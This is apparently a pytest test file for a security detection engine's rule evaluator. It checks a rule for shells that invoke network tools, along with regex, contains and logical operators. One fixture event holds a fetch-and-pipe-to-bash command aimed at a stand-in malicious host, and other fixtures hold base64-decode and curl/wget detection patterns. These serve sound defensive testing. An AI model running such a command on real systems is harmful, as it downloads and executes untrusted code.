import pytest
from app.detection.engine.rule_loader import RuleLoader
from app.detection.engine.rule_evaluator import RuleEvaluator
from app.detection.schemas.rule_schema import DetectionRule

@pytest.fixture
def sample_rule():
    loader = RuleLoader()
    rules = loader.load_all_rules()
    # Default load_all_rules skips disabled. We need the disabled sample.
    all_rules = loader.load_rules_from_directory(loader.rules_path, include_disabled=True)
    rule = next((r for r in all_rules if r.id == "linux_t1059_shell_network_tool_sample"), None)
    return rule

@pytest.fixture
def evaluator():
    return RuleEvaluator()

def test_bash_with_curl_matches_sample_rule(evaluator, sample_rule):
    event = {
        "process": {
            "name": "bash",
            "command_line": "curl http://malicious.com/shell.sh | bash",
            "parent": {"name": "sshd"},
            "executable": "/usr/bin/bash"
        },
        "user": {"name": "root"},
        "host": {"name": "production-web-01"}
    }
    result = evaluator.evaluate(event, sample_rule)
    assert result.matched is True
    assert any("process.name matched in" in r for r in result.match_reasons)
    assert any("process.command_line contained one of" in r for r in result.match_reasons)

def test_sh_without_network_tool_does_not_match(evaluator, sample_rule):
    event = {
        "process": {
            "name": "sh",
            "command_line": "ls -la /etc",
            "parent": {"name": "sshd"}
        },
        "user": {"name": "root"},
        "host": {"name": "production-web-01"}
    }
    result = evaluator.evaluate(event, sample_rule)
    assert result.matched is False

def test_missing_required_field_is_recorded(evaluator, sample_rule):
    # Sample rule requires: process.name, process.command_line, process.parent.name, user.name, host.name
    event = {
        "process": {
            "name": "bash",
            # "command_line" is missing
            "parent": {"name": "sshd"}
        },
        "user": {"name": "root"},
        "host": {"name": "production-web-01"}
    }
    result = evaluator.evaluate(event, sample_rule)
    assert "process.command_line" in result.missing_fields
    # It should still match if the logic doesn't depend on the missing field, 
    # but the sample rule DOES depend on command_line.
    assert result.matched is False

def test_contains_any_is_case_insensitive(evaluator):
    rule_data = {
        "id": "test_ci",
        "name": "Test CI",
        "description": "Test Case Insensitivity",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["msg"],
        "condition": {
            "field": "msg",
            "operator": "contains_any",
            "value": ["CURL", "Wget"]
        },
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    event = {"msg": "using curl to download"}
    result = evaluator.evaluate(event, rule)
    assert result.matched is True

def test_regex_operator_works(evaluator):
    rule_data = {
        "id": "test_regex",
        "name": "Test Regex",
        "description": "Test Regex Operator",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["msg"],
        "condition": {
            "field": "msg",
            "operator": "regex",
            "value": "base64\\s+-[ed]"
        },
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    event = {"msg": "echo YmFzaAo= | base64 -d"}
    result = evaluator.evaluate(event, rule)
    assert result.matched is True

def test_all_condition_requires_all_matches(evaluator):
    rule_data = {
        "id": "test_all",
        "name": "Test All",
        "description": "Test All Block",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["f1", "f2"],
        "condition": {
            "all": [
                {"field": "f1", "operator": "equals", "value": "v1"},
                {"field": "f2", "operator": "equals", "value": "v2"}
            ]
        },
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    
    # Only one matches
    assert evaluator.evaluate({"f1": "v1", "f2": "wrong"}, rule).matched is False
    # Both match
    assert evaluator.evaluate({"f1": "v1", "f2": "v2"}, rule).matched is True

def test_any_condition_matches_when_one_matches(evaluator):
    rule_data = {
        "id": "test_any",
        "name": "Test Any",
        "description": "Test Any Block",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["f1"],
        "condition": {
            "any": [
                {"field": "f1", "operator": "equals", "value": "v1"},
                {"field": "f1", "operator": "equals", "value": "v2"}
            ]
        },
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    assert evaluator.evaluate({"f1": "v1"}, rule).matched is True
    assert evaluator.evaluate({"f1": "v2"}, rule).matched is True
    assert evaluator.evaluate({"f1": "v3"}, rule).matched is False

def test_not_condition_excludes_parent(evaluator):
    rule_data = {
        "id": "test_not",
        "name": "Test Not",
        "description": "Test Not Block",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["process.parent.name"],
        "condition": {
            "not": {
                "field": "process.parent.name",
                "operator": "in",
                "value": ["npm", "pnpm", "make"]
            }
        },
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    # Excluded parent
    assert evaluator.evaluate({"process": {"parent": {"name": "npm"}}}, rule).matched is False
    # Allowed parent (non-excluded)
    assert evaluator.evaluate({"process": {"parent": {"name": "bash"}}}, rule).matched is True


# ---------------------------------------------------------------------------
# New operators (Step 6)
# ---------------------------------------------------------------------------

class TestNewOperators:
    def _cond(self, evaluator, event, **cond):
        return evaluator.evaluate_condition(event, cond)[0]

    def test_contains_all_all_present(self, evaluator):
        ev = {"cmd": "chmod +x /tmp/x && run"}
        assert self._cond(evaluator, ev, field="cmd", operator="contains_all",
                          value=["chmod", "+x"]) is True

    def test_contains_all_one_missing(self, evaluator):
        ev = {"cmd": "chmod /tmp/x"}
        assert self._cond(evaluator, ev, field="cmd", operator="contains_all",
                          value=["chmod", "+x"]) is False

    def test_contains_all_empty_list_is_false(self, evaluator):
        assert self._cond(evaluator, {"cmd": "x"}, field="cmd",
                          operator="contains_all", value=[]) is False

    def test_gte_numeric(self, evaluator):
        assert self._cond(evaluator, {"n": 90}, field="n", operator="gte", value=80) is True
        assert self._cond(evaluator, {"n": 70}, field="n", operator="gte", value=80) is False

    def test_lte_numeric(self, evaluator):
        assert self._cond(evaluator, {"n": 5}, field="n", operator="lte", value=10) is True
        assert self._cond(evaluator, {"n": 15}, field="n", operator="lte", value=10) is False

    def test_gte_string_coercion(self, evaluator):
        # numeric-looking strings are coerced
        assert self._cond(evaluator, {"n": "90"}, field="n", operator="gte", value="80") is True

    def test_gte_non_numeric_fails_closed(self, evaluator):
        assert self._cond(evaluator, {"n": "abc"}, field="n", operator="gte", value=80) is False

    def test_list_intersects_true(self, evaluator):
        ev = {"tags": ["Linux", "T1059"]}
        assert self._cond(evaluator, ev, field="tags", operator="list_intersects",
                          value=["t1059", "t1110"]) is True

    def test_list_intersects_false(self, evaluator):
        ev = {"tags": ["Linux", "T1543"]}
        assert self._cond(evaluator, ev, field="tags", operator="list_intersects",
                          value=["t1059", "t1110"]) is False

    def test_not_exists_on_missing_field(self, evaluator):
        assert self._cond(evaluator, {"process": {}}, field="process.parent.name",
                          operator="not_exists") is True

    def test_not_exists_on_present_field(self, evaluator):
        ev = {"process": {"parent": {"name": "sshd"}}}
        assert self._cond(evaluator, ev, field="process.parent.name",
                          operator="not_exists") is False
